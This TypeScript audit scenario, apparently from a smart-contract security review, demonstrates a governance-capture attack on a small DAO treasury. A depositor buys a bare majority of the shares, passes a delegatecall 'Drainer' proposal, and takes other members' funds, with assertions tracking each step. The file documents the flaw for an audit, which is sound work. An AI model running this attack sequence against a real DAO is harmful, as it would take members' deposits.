/**
 * Component 7, rows ECO-01 / ECO-02 / ECO-03: capture of a small treasury by a large depositor,
 * sleeping members, and the minRetention denominator. Treasury 3050 USDC (F 50, A/B/C 1000). W deposits
 * 3051 USDC (50.01% of supply) and proposes "pay W everything". A votes NO (awake, outvoted), B sleeps,
 * C ragequits in grace. Expected (all demonstrated): C keeps its 1000; A and B lose 1000 each and F 50
 * although A voted NO; C's exit (16.4% of the high-water supply) is far below the 34% retention trigger,
 * which W's own deposit pushed out of reach: with W >= 66% of supply the others cannot trigger it at all.
 */
import { assert, deposit, fmt, fmtS, fund, processProposal, proposalInfo, propose, ragequit, read, runIfMain, seedMembers, SETTLEMENT_UNIT, shutdown, snapshot, step, verdict, vote, warpPastGrace, warpPastVoting } from "../../../scenarios/lib.js";
import { encodeFunctionData } from "viem";

import { bootAudit, deployAudit } from "./lib-audit.js";

export async function main(): Promise<void> {
  const mirror = await bootAudit("audit-eco01");
  let passed = false;
  try {
    const seeded = await seedMembers(mirror);
    const W = mirror.actors.W.account.address;

    step("W deposits treasury + 1 USDC = 3051 USDC at NAV 1 -> 3051e18 shares = 50.01% of supply");
    await fund(mirror, "W", 10_000n * SETTLEMENT_UNIT);
    const wDeposit = seeded.safeSettlement + SETTLEMENT_UNIT;
    const dep = await deposit(mirror, "W", wDeposit);
    const afterDep = await snapshot(mirror, "after W deposit", ["F", "A", "B", "C", "W"]);
    assert(dep.sharesMinted * 2n > afterDep.totalShares, `W holds ${fmt(dep.sharesMinted)} of ${fmt(afterDep.totalShares)} shares (> 50%)`);

    step("W proposes: move the Safe's whole USDC balance at execution time to W (delegatecall Drainer, operation 1); W YES, A NO, B asleep");
    const drainer = await deployAudit(mirror.actors.W, "Drainer");
    const grab = await propose(mirror, "W", [{ to: drainer.address, operation: 1, data: encodeFunctionData({ abi: drainer.artifact.abi, functionName: "drain", args: [mirror.dao.settlement, W] }) }], "W: pay W 100% of the treasury (whatever remains at execution)");
    await vote(mirror, "W", grab.id, true);
    await vote(mirror, "A", grab.id, false);
    const info = await proposalInfo(mirror, grab.id);
    assert(info.yesVotes > info.noVotes, `yes ${fmt(info.yesVotes)} > no ${fmt(info.noVotes)}: A's NO changes nothing`);

    step("grace: C ragequits (the only remedy that works); B sleeps through 6 h voting + 6 h grace");
    await warpPastVoting(mirror, grab.id);
    const exitC = await ragequit(mirror, "C");
    assert(exitC.paid === 1_000n * SETTLEMENT_UNIT, `C exits with exactly ${fmtS(exitC.paid)} USDC (its deposit; NAV still 1)`);
    const highWater = afterDep.totalShares;
    const retentionFloor = (highWater * 66n) / 100n;
    const supplyNow = await read<bigint>(mirror, "shares", "totalSupply");
    console.log(`   minRetention: supply now ${fmt(supplyNow)} vs floor 66% of high-water ${fmt(highWater)} = ${fmt(retentionFloor)}; exits so far ${fmt(highWater - supplyNow)} = ${Number(((highWater - supplyNow) * 10_000n) / highWater) / 100}% (needs > 34%)`);
    const othersTotal = highWater - dep.sharesMinted;
    const needed = highWater - retentionFloor + 1n;
    console.log(`   to defeat by exit the non-W members (${fmt(othersTotal)} shares) must burn > ${fmt(highWater - retentionFloor)} shares = ${Number((needed * 10_000n) / othersTotal) / 100}% of THEIR total; at W >= 66% of supply this exceeds 100% (unreachable)`);

    step("execute: W takes everything that is left");
    await warpPastGrace(mirror, grab.id);
    const wBefore = await read<bigint>(mirror, "settlement", "balanceOf", [W]);
    const result = await processProposal(mirror, "W", grab);
    assert(result.info.status.passed && !result.info.status.actionFailed, "proposal executed");
    const final = await snapshot(mirror, "final", ["F", "A", "B", "C", "W"]);
    const wAfter = final.settlement.W;
    const gain = wAfter - wBefore - wDeposit;
    assert(final.safeSettlement === 0n, "Safe holds 0");
    console.log(`   W received ${fmtS(wAfter - wBefore)} USDC = its own ${fmtS(wDeposit)} + ${fmtS(gain)} taken from F (50), A (1000, voted NO) and B (1000, asleep)`);
    assert(gain === 2_050n * SETTLEMENT_UNIT, `attacker gain = 2050 USDC for a deposit of ${fmtS(wDeposit)} locked 12 h and 3 transactions`);
    const exitA = await ragequit(mirror, "A");
    assert(exitA.paid === 0n, `A (voted NO, did not exit) now exits with ${fmtS(exitA.paid)} USDC`);
    console.log("   cost/benefit: capital at risk during the 12 h = 3051 USDC exposed only to proposals the attacker itself does not vote down (it is awake); gas ~3 tx; gain = every share that neither exits nor out-weighs it");
    passed = true;
  } finally {
    verdict("ECO-01/02/03 capture-small-treasury", passed);
    await shutdown(mirror);
  }
}

runIfMain(import.meta.url, main);
